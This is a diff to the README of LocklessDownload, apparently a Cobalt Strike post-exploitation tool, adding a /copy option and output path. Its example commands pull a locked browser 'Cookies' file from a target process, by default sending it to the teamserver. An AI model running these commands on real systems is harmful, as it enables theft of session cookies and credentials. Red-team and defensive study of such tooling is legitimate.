@@ -17,15 +17,20 @@ lockless-enum Options:
 LocklessDownload can be used to download locked files. LocklessDownload requires the Process ID of the target process containing the open file handle, along with either the handle ID of the open file handle for the target file, or the filename to be downloaded. 
 ### LocklessDownload Usage
 ```
-Usage: lockless-download <pid> <key> <value>
-Example: 
+Usage: lockless-download <pid> <key> <value> <options>
+Example:
    lockless-download 789 filename Cookies 
    lockless-download 789 handle_id 696
-lockless-download Options: 
-    <pid> -     (Required): Process ID (PID) of the target application, queried for handles to desired locked file
-    <key> -     (Required): This can either be 'filename' or 'handle_id'
-    <value> -   (Required): If 'filename' is chosen, provide the full name of the file to be downloaded. The filename is case sensitive
+   lockless-download 789 handle_id 696 /copy C:\Users\<user>\AppData\Local\cookies123.tmp
+lockless-download Options:
+    <pid> -     	(Required): Process ID (PID) of the target application, queried for handles to desired locked file
+    <key> -     	(Required): This can either be 'filename' or 'handle_id'
+    <value> -   	(Required): If 'filename' is chosen, provide the full name of the file to be downloaded. The filename is case sensitive
                             If 'handle_id' is chosen, provide the handle ID to the locked file to be downloaded
+    /copy -      	(optional): If the /copy switch is included, the file will be copied to disk. If not included, the file will filelessly be download to the cobalt strike teamserver. 
+    <outputFile> - 	(optional): Full output path of file (ex: C:\Users\<user>\AppData\Local\cookies123.tmp)
+    ");
+
 ```
 ## Example
 Find out which process has a handle to the locked "Cookies" file and retrieve the handle id
